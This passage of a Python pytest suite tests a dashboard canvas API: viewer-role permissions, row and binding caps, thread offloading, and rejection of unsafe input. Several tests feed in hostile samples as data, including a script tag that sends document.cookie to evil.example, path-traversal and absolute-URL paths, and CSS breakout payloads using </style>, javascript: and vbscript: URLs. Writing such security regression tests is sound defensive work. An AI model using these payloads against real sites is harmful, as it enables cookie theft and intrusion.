        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        resp = await client.delete(
            f"/api/v1/canvases/{canvas_id}",
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_cannot_schedule_canvas(self, canvas_client_with_viewer):
        """Viewer role is forbidden (403) from POST /canvases/{id}/schedule."""
        client, owner_id, _owner_org, viewer_id, *_ = canvas_client_with_viewer

        # Create a canvas as the owner.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Owner Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        resp = await client.post(
            f"/api/v1/canvases/{canvas_id}/schedule",
            json={"recipients": ["viewer@example.com"]},
            headers=_auth_headers(viewer_id),
        )
        assert resp.status_code == 403, resp.text

    @pytest.mark.asyncio
    async def test_viewer_can_still_get_canvas(self, canvas_client_with_viewer, fake_db):
        """GET endpoints remain accessible to viewers (read-only is fine).

        We create a canvas as the viewer (by temporarily granting owner role) then
        downgrade to viewer to assert they can still list/get. This avoids the
        org-resolution ambiguity of seeding a user into multiple orgs.
        """
        client, _owner_id, _owner_org, viewer_id, viewer_org_id, repo = canvas_client_with_viewer

        # Temporarily grant owner so the create succeeds.
        repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="owner")

        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Readable Canvas"},
            headers=_auth_headers(viewer_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        # Downgrade back to viewer.
        repo.seed_org_member(org_id=viewer_org_id, user_id=viewer_id, role="viewer")

        # Viewer can GET the canvas list and the specific canvas.
        list_resp = await client.get("/api/v1/canvases", headers=_auth_headers(viewer_id))
        assert list_resp.status_code == 200

        get_resp = await client.get(
            f"/api/v1/canvases/{canvas_id}", headers=_auth_headers(viewer_id)
        )
        assert get_resp.status_code == 200

    # ── Finding 3: PUT rejects docs with script tags ─────────────────────────

    @pytest.mark.asyncio
    async def test_put_rejects_doc_with_script_tag(self, canvas_client_with_viewer):
        """PUT /canvases/{id} must 400 when config.doc contains a <script> tag.

        Regression for MED safety finding: without this check a writer can
        store XSS payloads in the canvas config that are later rendered.
        """
        client, owner_id, *_ = canvas_client_with_viewer

        # Create a clean canvas first.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Safe Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        # Attempt to update with a doc containing a <script> tag.
        xss_doc = {
            "version": 1,
            "title": "XSS attempt",
            "html": '<div><script>fetch("https://evil.example/steal?c="+document.cookie)</script></div>',
            "bindings": {},
        }
        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"config": {"doc": xss_doc}},
            headers=_auth_headers(owner_id),
        )
        assert resp.status_code == 400, resp.text
        body = resp.json()
        # AppError serialises as {"error": {"code": ..., "message": ...}}
        error_code = body.get("code") or (body.get("error") or {}).get("code")
        assert error_code == "invalid_canvas_doc", body

    @pytest.mark.asyncio
    async def test_put_allows_valid_doc(self, canvas_client_with_viewer):
        """PUT /canvases/{id} accepts a config.doc that passes validation."""
        client, owner_id, *_ = canvas_client_with_viewer

        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "Canvas"},
            headers=_auth_headers(owner_id),
        )
        assert create_resp.status_code == 201
        canvas_id = create_resp.json()["id"]

        valid_doc = {
            "version": 1,
            "title": "Safe",
            "html": '<div><nubi-kpi data-el-id="el1"></nubi-kpi></div>',
            "bindings": {},
        }
        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"config": {"doc": valid_doc}},
            headers=_auth_headers(owner_id),
        )
        assert resp.status_code == 200, resp.text


# ---------------------------------------------------------------------------
# 7. Regression: row-cap and binding-count caps (security findings)
# ---------------------------------------------------------------------------


class TestCanvasCapRegression:
    """Regression tests for the OOM row-cap and binding-count-cap fixes."""

    # ── 7a. API binding result is row-capped + path resolves (regression) ────

    @pytest.mark.asyncio
    async def test_api_binding_result_is_row_capped(self):
        """API binding: Arrow table is sliced to _ROW_CAP BEFORE to_pylist().

        Regression for the MED resource finding: the api branch previously called
        result_table.to_pylist() with NO row cap and then truncated the Python
        list, materialising the full result in memory first.  The fix calls
        result_table.slice(0, cap) before to_pylist() so memory stays bounded.
        """
        import pyarrow as pa

        from app.dashboards.collect import collect_canvas_data, _ROW_CAP  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        conn_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        # Seed a datastore record so collect_canvas_data can look it up.
        await repo.create(
            "datastores",
            org_id=org_id,
            created_by=user_id,
            name="Test API DS",
            id=conn_id,
            config={"type": "http_json", "url": "http://api.example.com"},
        )

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="API OOM Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-value data-el-id="el_api"></nubi-value>',
                    "bindings": {
                        "el_api": {
                            "kind": "api",
                            "connector_id": conn_id,
                            "path": "/data",
                        },
                    },
                }
            },
        )

        # Build a real PyArrow table with _ROW_CAP + 10 rows.
        cap = _ROW_CAP if _ROW_CAP > 0 else 100_000
        over_cap = cap + 10
        big_table = pa.table({"value": list(range(over_cap))})

        # Track whether slice was called before to_pylist by wrapping the table.
        slice_called_before_pylist: list[bool] = []

        class _TrackingTable:
            """Wraps big_table, recording whether slice() was called first.

            ``_was_produced_by_slice`` is True only on instances returned by
            ``slice()``, so that ``to_pylist()`` can record whether it is being
            called on the sliced result (correct) vs. the raw result (bug).
            """

            def __init__(self, inner: pa.Table, *, was_produced_by_slice: bool = False) -> None:
                self._inner = inner
                self._was_produced_by_slice = was_produced_by_slice

            def __len__(self) -> int:
                return len(self._inner)

            @property
            def schema(self):
                return self._inner.schema

            def slice(self, offset: int, length: int) -> "_TrackingTable":
                return _TrackingTable(self._inner.slice(offset, length), was_produced_by_slice=True)

            def to_pylist(self):
                slice_called_before_pylist.append(self._was_produced_by_slice)
                return self._inner.to_pylist()

        tracking_table = _TrackingTable(big_table)

        class _FakeHttpConnector:
            def execute(self, plan):
                return tracking_table

            def capabilities(self):
                return {"predicate_rls": True}

            def close(self):
                pass

        with patch(
            "app.connectors.http_json.HttpJsonConnector",
            return_value=_FakeHttpConnector(),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert "el_api" in result
        entry = result["el_api"]
        assert "error" not in entry, f"Unexpected error: {entry.get('error')}"
        assert len(entry["rows"]) == cap, (
            f"Expected rows truncated to {cap}, got {len(entry['rows'])}"
        )
        # Verify slice() was called before to_pylist() (memory bounded).
        assert slice_called_before_pylist, "to_pylist() was never called"
        assert slice_called_before_pylist[0] is True, (
            "slice() must be called BEFORE to_pylist() to bound memory"
        )

    @pytest.mark.asyncio
    async def test_api_binding_with_path_resolves(self):
        """API binding 'path' is appended to the base URL, 'select' sets record_path.

        Regression for the MED correctness finding: the api branch previously
        ignored binding['path'] and binding['select'], so every HTTP_JSON binding
        fetched the bare base URL and always got UNSUPPORTED_QUERY or wrong data.
        The fix merges the binding path onto the datastore URL before constructing
        the HttpJsonConnector, and maps 'select' to 'record_path'.
        """
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415
        import pyarrow as pa

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        conn_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        base_url = "http://api.example.com"

        await repo.create(
            "datastores",
            org_id=org_id,
            created_by=user_id,
            name="API Path DS",
            id=conn_id,
            config={"type": "http_json", "url": base_url},
        )

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Path Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-value data-el-id="el_path"></nubi-value>',
                    "bindings": {
                        "el_path": {
                            "kind": "api",
                            "connector_id": conn_id,
                            "path": "/v1/users",
                            "select": "$.data.items",
                        },
                    },
                }
            },
        )

        captured_config: dict = {}

        def _capture_connector(config: dict):
            captured_config.update(config)

            class _MockConn:
                def execute(self, plan):
                    return pa.table({"id": [1, 2], "name": ["Alice", "Bob"]})

                def capabilities(self):
                    return {"predicate_rls": True}

                def close(self):
                    pass

            return _MockConn()

        with patch(
            "app.connectors.http_json.HttpJsonConnector",
            side_effect=_capture_connector,
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        # The connector must have been constructed with the merged URL.
        assert captured_config.get("url") == f"{base_url}/v1/users", (
            f"Expected URL with path appended, got: {captured_config.get('url')!r}"
        )
        # 'select' = '$.data.items' → record_path = 'data.items'
        assert captured_config.get("record_path") == "data.items", (
            f"Expected record_path='data.items', got: {captured_config.get('record_path')!r}"
        )

        assert "el_path" in result
        entry = result["el_path"]
        assert "error" not in entry, f"Unexpected error: {entry.get('error')}"
        assert entry["columns"] == ["id", "name"]
        assert len(entry["rows"]) == 2

    # ── 7b. run_query_rows truncates Arrow table BEFORE to_pylist ────────────

    @pytest.mark.asyncio
    async def test_run_query_rows_truncates_arrow_before_to_pylist(self):
        """run_query_rows slices the Arrow table to _ROW_CAP before to_pylist().

        Regression for the MED resource finding: the original code called
        to_pylist() first (materialising the full result) then sliced the Python
        list.  The fix calls arrow_table.slice(0, cap) first so only _ROW_CAP
        rows are ever held in Python memory as dicts.
        """
        import pyarrow as pa

        from app.dashboards.collect import run_query_rows, _ROW_CAP  # noqa: PLC0415
        from app.queries.registry import get_query_registry  # noqa: PLC0415

        cap = _ROW_CAP if _ROW_CAP > 0 else 100_000
        over_cap = cap + 5

        # Register a temporary query so run_query_rows can find it.
        reg = get_query_registry()
        import types as _types  # noqa: PLC0415

        fake_query_id = f"_test_cap_{uuid.uuid4().hex}"
        fake_query = _types.SimpleNamespace(
            id=fake_query_id,
            sql="SELECT 1",
            params=[],
            datastore_id=None,
        )

        def _patched_get(qid):
            if qid == fake_query_id:
                return fake_query
            return reg._store.get(qid)

        # Track Arrow slice vs to_pylist call order.
        slice_before_pylist: list[bool] = []

        class _TrackingTable:
            def __init__(self, inner: pa.Table, was_sliced: bool = False) -> None:
                self._inner = inner
                self._sliced = was_sliced

            def __len__(self) -> int:
                return len(self._inner)

            @property
            def schema(self):
                return self._inner.schema

            def slice(self, offset: int, length: int) -> "_TrackingTable":
                return _TrackingTable(self._inner.slice(offset, length), was_sliced=True)

            def to_pylist(self):
                slice_before_pylist.append(self._sliced)
                return self._inner.to_pylist()

        big_inner = pa.table({"n": list(range(over_cap))})
        tracking_table = _TrackingTable(big_inner)

        class _FakeConnector:
            def execute(self, plan):
                return tracking_table

            def close(self):
                pass

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())

        with (
            patch.object(reg, "get", side_effect=_patched_get),
            patch(
                "app.dashboards.collect._resolve_connector",
                new=AsyncMock(return_value=(_FakeConnector(), False)),
            ),
        ):
            columns, rows = await run_query_rows(
                query_id=fake_query_id,
                org_id=org_id,
                repo=repo,
                policies={},
            )

        assert len(rows) == cap, f"Expected {cap} rows, got {len(rows)}"
        assert slice_before_pylist, "to_pylist() was never called"
        assert slice_before_pylist[0] is True, (
            "slice() must be called BEFORE to_pylist() so large results "
            "are never fully materialised into Python memory"
        )

    # ── 7b. Canvas with >500 bindings is rejected at parse (max_length=500) ─

    def test_canvas_doc_with_501_bindings_rejected_at_parse(self):
        """CanvasDoc.bindings has max_length=500; 501 entries must be rejected.

        Regression for the LOW resource finding: without max_length=500 on the
        Field, an attacker could craft a canvas doc with arbitrarily many bindings
        and force the server to spawn one coroutine per binding with no upper bound.
        """
        from pydantic import ValidationError  # noqa: PLC0415

        bindings = {
            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
            for i in range(501)
        }
        with pytest.raises(ValidationError) as exc_info:
            CanvasDoc.model_validate(
                {
                    "version": 1,
                    "title": "Too Many Bindings",
                    "html": "<div></div>",
                    "bindings": bindings,
                }
            )
        # Confirm the error is about the bindings dict length.
        err_str = str(exc_info.value)
        assert "bindings" in err_str.lower() or "500" in err_str, (
            f"Unexpected validation error: {err_str}"
        )

    def test_canvas_doc_with_exactly_500_bindings_accepted(self):
        """CanvasDoc.bindings accepts exactly 500 entries (boundary check)."""
        bindings = {
            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
            for i in range(500)
        }
        doc = CanvasDoc.model_validate(
            {
                "version": 1,
                "title": "Max Bindings",
                "html": "<div></div>",
                "bindings": bindings,
            }
        )
        assert len(doc.bindings) == 500

    # ── 7c. collect_canvas_data caps bindings at _MAX_CANVAS_BINDINGS ────────

    @pytest.mark.asyncio
    async def test_collect_caps_bindings_at_max_canvas_bindings(self):
        """collect_canvas_data truncates bindings to _MAX_CANVAS_BINDINGS before gather.

        Even if a raw canvas doc dict (bypassing Pydantic) somehow has >500
        bindings (e.g. legacy data), the collector must not fan-out more than
        _MAX_CANVAS_BINDINGS coroutines.
        """
        from app.dashboards.collect import collect_canvas_data, _MAX_CANVAS_BINDINGS  # noqa: PLC0415

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        max_b = _MAX_CANVAS_BINDINGS if _MAX_CANVAS_BINDINGS > 0 else 500
        over_max = max_b + 5

        # Build raw bindings dict with over_max entries.
        raw_bindings = {
            f"el_{i}": {"kind": "query", "query_id": f"q_{i}"}
            for i in range(over_max)
        }

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Oversized Bindings Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": "<div></div>",
                    "bindings": raw_bindings,
                }
            },
        )

        call_count = 0

        async def _mock_run_query_rows(query_id, org_id, repo, policies):
            nonlocal call_count
            call_count += 1
            return (["v"], [[call_count]])

        with patch(
            "app.dashboards.collect.run_query_rows",
            new=AsyncMock(side_effect=_mock_run_query_rows),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert len(result) == max_b, (
            f"Expected at most {max_b} binding results, got {len(result)}"
        )
        assert call_count == max_b, (
            f"Expected exactly {max_b} run_query_rows calls, got {call_count}"
        )


# ---------------------------------------------------------------------------
# 8. Async offload: connector.execute is called off the event loop
# ---------------------------------------------------------------------------


class TestRunQueryRowsAsyncOffload:
    """run_query_rows must offload connector.execute to a worker thread.

    The sync execute() call used to block the event loop for the full query
    duration, stalling all concurrent requests.  The fix wraps it in
    asyncio.to_thread() so it runs in the default ThreadPoolExecutor.
    """

    @pytest.mark.asyncio
    async def test_execute_runs_in_worker_thread(self):
        """connector.execute is NOT called on the event loop thread.

        We verify this by capturing the thread identity inside execute() and
        comparing it to the event loop thread identity.  They must differ.
        """
        import threading
        import types as _types
        import pyarrow as pa

        from app.dashboards.collect import run_query_rows  # noqa: PLC0415
        from app.queries.registry import get_query_registry  # noqa: PLC0415

        loop_thread_id = threading.current_thread().ident
        execute_thread_ids: list[int] = []

        class _ThreadTrackingConnector:
            def execute(self, plan):
                execute_thread_ids.append(threading.current_thread().ident)
                return pa.table({"x": [1, 2, 3]})

            def close(self):
                pass

        reg = get_query_registry()
        fake_query_id = f"_test_thread_{uuid.uuid4().hex}"
        fake_query = _types.SimpleNamespace(
            id=fake_query_id,
            sql="SELECT 1",
            params=[],
            datastore_id=None,
        )

        def _patched_get(qid):
            if qid == fake_query_id:
                return fake_query
            return reg._store.get(qid)

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())

        with (
            patch.object(reg, "get", side_effect=_patched_get),
            patch(
                "app.dashboards.collect._resolve_connector",
                new=AsyncMock(return_value=(_ThreadTrackingConnector(), False)),
            ),
        ):
            columns, rows = await run_query_rows(
                query_id=fake_query_id,
                org_id=org_id,
                repo=repo,
                policies={},
            )

        assert columns == ["x"]
        assert rows == [[1], [2], [3]]
        assert execute_thread_ids, "execute() was never called"
        assert execute_thread_ids[0] != loop_thread_id, (
            "connector.execute() ran on the event loop thread — it must run "
            "in a worker thread via asyncio.to_thread()"
        )

    @pytest.mark.asyncio
    async def test_api_execute_runs_in_worker_thread(self):
        """API binding connector.execute is NOT called on the event loop thread.

        This covers the second execute() call in collect_canvas_data's 'api'
        branch (~line 521 after the fix).  The same asyncio.to_thread() fix
        applies there independently of run_query_rows.
        """
        import threading
        import pyarrow as pa

        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        loop_thread_id = threading.current_thread().ident
        execute_thread_ids: list[int] = []

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        conn_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        await repo.create(
            "datastores",
            org_id=org_id,
            created_by=user_id,
            name="Thread Check DS",
            id=conn_id,
            config={"type": "http_json", "url": "http://api.example.com"},
        )

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Thread Check Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-value data-el-id="el_t"></nubi-value>',
                    "bindings": {
                        "el_t": {
                            "kind": "api",
                            "connector_id": conn_id,
                            "path": "/data",
                        },
                    },
                }
            },
        )

        class _ThreadTrackingHttpConn:
            def execute(self, plan):
                execute_thread_ids.append(threading.current_thread().ident)
                return pa.table({"v": [42]})

            def capabilities(self):
                return {"predicate_rls": True}

            def close(self):
                pass

        with patch(
            "app.connectors.http_json.HttpJsonConnector",
            return_value=_ThreadTrackingHttpConn(),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas["id"],
                org_id=org_id,
                claims={},
                repo=repo,
            )

        assert "el_t" in result
        assert "error" not in result["el_t"], result["el_t"]
        assert execute_thread_ids, "execute() was never called"
        assert execute_thread_ids[0] != loop_thread_id, (
            "API connector.execute() ran on the event loop thread — it must "
            "run in a worker thread via asyncio.to_thread()"
        )


# ---------------------------------------------------------------------------
# 9. Path-traversal rejection for API binding paths
# ---------------------------------------------------------------------------


class TestApiBindingPathValidation:
    """collect_canvas_data rejects unsafe paths in API bindings.

    A path like '../', '../../admin', 'http://evil.example/', or
    '//evil.example' must be refused before being joined onto the
    connector base URL.  The entry should get an 'error' key
    ('invalid_binding_path') via the best-effort handler, NOT raise.
    """

    async def _make_canvas_with_path(
        self, path: str
    ) -> tuple["InMemoryRepo", str, str, str]:
        """Helper: seed a repo + canvas with a single API binding at *path*."""
        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        conn_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        await repo.create(
            "datastores",
            org_id=org_id,
            created_by=user_id,
            name="Path Test DS",
            id=conn_id,
            config={"type": "http_json", "url": "http://api.example.com"},
        )

        canvas = await repo.create(
            "canvases",
            org_id=org_id,
            created_by=user_id,
            name="Path Test Canvas",
            config={
                "doc": {
                    "version": 1,
                    "html": '<nubi-value data-el-id="el_p"></nubi-value>',
                    "bindings": {
                        "el_p": {
                            "kind": "api",
                            "connector_id": conn_id,
                            "path": path,
                        },
                    },
                }
            },
        )
        return repo, org_id, canvas["id"]

    @pytest.mark.asyncio
    async def test_dotdot_path_is_rejected(self):
        """Path containing '..' segment is rejected as invalid_binding_path."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path("../../admin")

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        assert "el_p" in result
        entry = result["el_p"]
        assert "error" in entry, f"Expected error for '..' path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    @pytest.mark.asyncio
    async def test_single_dotdot_segment_is_rejected(self):
        """Path that IS exactly '..' is rejected."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path("../")

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        entry = result.get("el_p", {})
        assert "error" in entry, f"Expected error for '../' path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    @pytest.mark.asyncio
    async def test_absolute_url_scheme_is_rejected(self):
        """Path containing a URL scheme ('http://...') is rejected."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path(
            "http://evil.example/steal"
        )

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        entry = result.get("el_p", {})
        assert "error" in entry, f"Expected error for absolute URL path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    @pytest.mark.asyncio
    async def test_protocol_relative_url_is_rejected(self):
        """Path starting with '//' (protocol-relative) is rejected."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path(
            "//evil.example/steal"
        )

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        entry = result.get("el_p", {})
        assert "error" in entry, f"Expected error for protocol-relative path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    @pytest.mark.asyncio
    async def test_valid_relative_path_is_accepted(self):
        """A normal relative path like '/v1/users' passes validation.

        We stub the HttpJsonConnector so no real HTTP call is made — only the
        path validation is exercised here; path-merging correctness is covered
        by test_api_binding_with_path_resolves above.
        """
        import pyarrow as pa
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path("/v1/users")

        class _FakeConn:
            def execute(self, plan):
                return pa.table({"id": [1]})

            def capabilities(self):
                return {"predicate_rls": True}

            def close(self):
                pass

        with patch(
            "app.connectors.http_json.HttpJsonConnector",
            return_value=_FakeConn(),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
            )

        entry = result.get("el_p", {})
        assert "error" not in entry, f"Valid path should not error: {entry}"
        assert entry.get("columns") == ["id"]

    # ---------------------------------------------------------------------------
    # NEW: [LOW] validate_canvas_doc rejects malicious assets.css at SAVE TIME
    # ---------------------------------------------------------------------------

    def test_css_with_style_close_tag_is_rejected(self):
        """assets.css containing </style> is rejected as a hard error at save time.

        Without this check an attacker could store </style><script>... in the
        CSS field and break out of a style block when the canvas is rendered.
        """
        doc = CanvasDoc.model_validate(
            {
                "html": "<div><p>safe</p></div>",
                "bindings": {},
                "assets": {"css": "body { color: red; } </style><script>alert(1)</script>"},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for </style> in CSS, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("</style>" in i.lower() or "style" in i.lower() for i in hard), hard

    def test_css_with_script_tag_is_rejected(self):
        """assets.css containing <script is rejected as a hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {"css": "<script>alert(1)</script>"},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for <script in CSS, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("script" in i.lower() for i in hard), hard

    def test_css_with_import_javascript_is_rejected(self):
        """assets.css containing @import javascript: is rejected as a hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {"css": '@import "javascript:alert(1)";'},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for @import javascript: in CSS, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("import" in i.lower() or "javascript" in i.lower() for i in hard), hard

    def test_css_with_import_data_text_is_rejected(self):
        """assets.css containing @import data:text is rejected as a hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {"css": "@import 'data:text/html,<h1>XSS</h1>';"},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for @import data:text in CSS, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("import" in i.lower() or "data" in i.lower() for i in hard), hard

    def test_css_with_url_javascript_is_rejected(self):
        """assets.css containing url(javascript:...) is rejected as a hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {"css": "body { background: url(javascript:alert(1)); }"},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for url(javascript:) in CSS, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("url" in i.lower() or "javascript" in i.lower() for i in hard), hard

    def test_css_with_url_vbscript_is_rejected(self):
        """assets.css containing url(vbscript:...) is rejected as a hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {"css": "body { background: url(vbscript:MsgBox('XSS')); }"},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for url(vbscript:) in CSS, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("url" in i.lower() or "vbscript" in i.lower() for i in hard), hard

    def test_safe_css_is_accepted(self):
        """Normal, safe CSS in assets.css passes validation without hard errors."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div><p>hello</p></div>",
                "bindings": {},
                "assets": {
                    "css": (
                        ".canvas { color: red; font-size: 14px; }\n"
                        "body { margin: 0; padding: 0; }\n"
                        "@media (max-width: 768px) { .canvas { width: 100%; } }"
                    )
                },
            }
        )
        ok, issues = validate_canvas_doc(doc)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Safe CSS should not produce hard errors: {hard}"

    def test_no_assets_css_field_is_accepted(self):
        """Canvas doc with no assets.css key passes validation without errors."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert hard == [], f"Empty assets should not produce hard errors: {hard}"

    def test_css_import_vbscript_is_rejected(self):
        """assets.css with @import vbscript: is rejected as a hard error."""
        doc = CanvasDoc.model_validate(
            {
                "html": "<div></div>",
                "bindings": {},
                "assets": {"css": "@import 'vbscript:alert(1)';"},
            }
        )
        ok, issues = validate_canvas_doc(doc)
        assert ok is False, f"Expected hard error for @import vbscript:, issues: {issues}"
        hard = [i for i in issues if not i.lstrip().lower().startswith("[warn]")]
        assert any("import" in i.lower() or "vbscript" in i.lower() for i in hard), hard

    @pytest.mark.asyncio
    async def test_empty_path_is_accepted(self):
        """An empty path (binding with no 'path') uses the base URL as-is.

        The validation block is skipped for empty paths so we just verify no
        rejection error is returned.
        """
        import pyarrow as pa
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path("")

        class _FakeConn:
            def execute(self, plan):
                return pa.table({"ok": [True]})

            def capabilities(self):
                return {"predicate_rls": True}

            def close(self):
                pass

        with patch(
            "app.connectors.http_json.HttpJsonConnector",
            return_value=_FakeConn(),
        ):
            result = await collect_canvas_data(
                canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
            )

        entry = result.get("el_p", {})
        assert "error" not in entry, f"Empty path should not error: {entry}"

    # ── URL-encoded path-traversal regression (MED finding) ──────────────────

    @pytest.mark.asyncio
    async def test_percent_encoded_dotdot_rejected_at_runtime(self):
        """Path '%2e%2e/admin' is rejected at runtime after URL-decoding.

        Regression for MED path-traversal: the original check compared literal
        '..' segments only; %2e%2e/%2e./etc. bypassed it.  After the fix,
        collect.py unquotes the path before checking, so the encoded form is
        caught too.
        """
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path("%2e%2e/admin")

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        entry = result.get("el_p", {})
        assert "error" in entry, f"Expected error for '%2e%2e/admin' path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    @pytest.mark.asyncio
    async def test_dot_percent2e_rejected_at_runtime(self):
        """Path '.%2e/admin' (mixed dot + encoded dot) is rejected at runtime."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path(".%2e/admin")

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        entry = result.get("el_p", {})
        assert "error" in entry, f"Expected error for '.%2e/admin' path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    @pytest.mark.asyncio
    async def test_percent2e_dot_rejected_at_runtime(self):
        """Path '%2e./admin' (encoded dot + literal dot) is rejected at runtime."""
        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415

        repo, org_id, canvas_id = await self._make_canvas_with_path("%2e./admin")

        result = await collect_canvas_data(
            canvas_id=canvas_id, org_id=org_id, claims={}, repo=repo
        )

        entry = result.get("el_p", {})
        assert "error" in entry, f"Expected error for '%2e./admin' path, got: {entry}"
        assert entry["error"] == "invalid_binding_path", entry

    # ── ApiBinding Pydantic validator (save-time defense-in-depth) ───────────

    def test_api_binding_rejects_percent_encoded_dotdot_at_save(self):
        """%2e%2e/admin is rejected by the ApiBinding field_validator at parse time."""
        from pydantic import ValidationError  # noqa: PLC0415

